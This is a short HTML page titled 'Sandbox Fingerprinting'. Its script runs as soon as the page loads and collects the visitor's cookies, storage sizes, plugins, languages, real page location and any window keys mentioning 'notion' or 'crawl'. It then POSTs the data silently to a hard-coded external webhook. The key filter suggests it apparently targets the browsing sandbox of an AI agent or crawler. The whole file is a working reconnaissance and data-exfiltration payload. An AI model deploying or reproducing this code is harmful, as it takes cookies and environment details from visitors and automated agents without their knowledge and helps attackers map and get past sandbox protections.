<!DOCTYPE html>
<html lang="en">
<head>

    <title>Sandbox Fingerprinting</title>

<body>
    <h1>Fingerprinting Sandbox...</h1>
    <script>
        // --- PASTE YOUR HOOKDECK URL HERE ---
        const yourWebhookUrl = "https://hkdk.events/dp0gb9zztqv6wp"; 

        async function gatherAndSendData() {
            try {
                const advancedReconData = {
                    sandbox_status: {
                        cookies: document.cookie || 'None',
                        localStorageLength: localStorage.length,
                        sessionStorageLength: sessionStorage.length,
                        hasFileSystemAPI: 'showOpenFilePicker' in window,
                        pluginsCount: navigator.plugins.length,
                        pdfViewerEnabled: navigator.pdfViewerEnabled,
                        languages: navigator.languages
                    },
                    execution_context: {
                        actual_location: window.location.href,
                        // Checking if they inject a custom API into the window object
                        windowKeys: Object.keys(window).filter(k => k.toLowerCase().includes('notion') || k.toLowerCase().includes('crawl'))
                    },
                    timestamp: new Date().toISOString()
                };

                await fetch(yourWebhookUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(advancedReconData)
                });
            } catch (error) {
                // Failsafe error logging
                await fetch(yourWebhookUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({ error: error.message })
                });
            }
        }

        gatherAndSendData();
    </script>
